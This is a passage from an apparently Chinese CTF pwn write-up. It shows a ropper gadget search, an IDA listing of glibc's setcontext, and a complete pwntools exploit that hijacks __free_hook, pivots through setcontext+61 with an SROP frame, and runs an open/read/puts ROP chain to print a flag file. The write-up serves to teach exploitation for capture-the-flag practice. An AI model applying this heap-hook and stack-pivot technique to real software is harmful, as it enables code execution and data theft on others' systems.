    ropper-f"./libc-2.30.so"--search"mov rdx"
可以搜索到这个位置存在合理的gadget
    #0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
如果有师傅不知道这个操作的，可以仔细的研究一下这个gadget，我们只需要合理的构造即可使得rdi参数的信息转到rdx上，且调用 **setcontext
+ 61** 这个位置。
    .text:0000000000055E00                 public setcontext ; weak
    .text:0000000000055E00 setcontext      proc near               ; CODE XREF: .text:000000000005C16C↓p
    .text:0000000000055E00                                         ; DATA XREF: LOAD:000000000000C6D8↑o
    .text:0000000000055E00                 push    rdi
    .text:0000000000055E01                 lea     rsi, [rdi+128h]
    .text:0000000000055E08                 xor     edx, edx
    .text:0000000000055E0A                 mov     edi, 2
    .text:0000000000055E0F                 mov     r10d, 8
    .text:0000000000055E15                 mov     eax, 0Eh
    .text:0000000000055E1A                 syscall                 ; $!
    .text:0000000000055E1C                 pop     rdx
    .text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
    .text:0000000000055E23                 jnb     short loc_55E80
    .text:0000000000055E25                 mov     rcx, [rdx+0E0h]
    .text:0000000000055E2C                 fldenv  byte ptr [rcx]
    .text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
    .text:0000000000055E35                 mov     rsp, [rdx+0A0h]
    .text:0000000000055E3C                 mov     rbx, [rdx+80h]
    .text:0000000000055E43                 mov     rbp, [rdx+78h]
    .text:0000000000055E47                 mov     r12, [rdx+48h]
    .text:0000000000055E4B                 mov     r13, [rdx+50h]
    .text:0000000000055E4F                 mov     r14, [rdx+58h]
    .text:0000000000055E53                 mov     r15, [rdx+60h]
    .text:0000000000055E57                 mov     rcx, [rdx+0A8h]
    .text:0000000000055E5E                 push    rcx
    .text:0000000000055E5F                 mov     rsi, [rdx+70h]
    .text:0000000000055E63                 mov     rdi, [rdx+68h]
    .text:0000000000055E67                 mov     rcx, [rdx+98h]
    .text:0000000000055E6E                 mov     r8, [rdx+28h]
    .text:0000000000055E72                 mov     r9, [rdx+30h]
    .text:0000000000055E76                 mov     rdx, [rdx+88h]
    .text:0000000000055E7D                 xor     eax, eax
    .text:0000000000055E7F                 retn
我们发现SROP中的frame信息，前0x28字节的信息基本上是没有用的，所以我们可以直接把前0x28字节的数据丢掉，并且补上一些配合gadget的数据。  
顺便一提，在执行orw的时候，我们其实可以直接利用libc中的函数来调用syscall，可以少找一条 **syscall gadget**
，说不定就差找这一条gadget的时间就拿到一血了呢？
###  EXP
    from pwn import *
    r = process('./pwn')
    #r = remote('node3.buuoj.cn', 28140)
    context.log_level = "debug"
    context.arch = "amd64"
    # libc = ELF('/glibc/x64/2.29/lib/libc.so.6')
    libc = ELF('./libc.so.6')
    r.recvuntil('GIFT: ')
    stdout_addr = int(r.recvuntil('\n')[:-1], 16)
    print "stdout_addr: " + hex(stdout_addr)
    libc.address = stdout_addr - libc.sym['_IO_2_1_stdout_']
    print "libc_base: " + hex(libc.address)
    r.sendafter('You can write a byte anywhere', p64(libc.address +   0x1ea2d0 + 0x7))
    r.sendafter('And what?', '\xFF')
    r.sendlineafter('Offset:', str(0x880))
    r.sendafter('Content:', p64(libc.sym['__free_hook']))
    #gdb.attach(r, 'b free')
    r.sendafter('size:', str(0x1530))
    pop_rdi_addr = libc.address + 0x0000000000026bb2
    pop_rsi_addr = libc.address + 0x000000000002709c
    pop_rdx_r12_addr = libc.address + 0x000000000011c3b1
    fake_frame_addr = libc.sym['__free_hook'] + 0x10
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = libc.address + 0x00000000000256b9  # : ret
    rop_data = [
        libc.sym['open'],
        pop_rdx_r12_addr,
        0x100,
        0x0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        libc.sym['read'],
        pop_rdi_addr,
        fake_frame_addr + 0x200,
        libc.sym['puts']
    ]
    gadget = libc.address + 0x0000000000154b20 #0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    frame = str(frame).ljust(0xF8, '\x00')
    payload = p64(gadget) + p64(fake_frame_addr) + '\x00' * 0x20 + p64(libc.sym['setcontext'] + 61) + \
              frame[0x28:] + "flag\x00\x00\x00\x00" + p64(0) + flat(rop_data)
    r.sendafter('>>', payload)
    r.interactive()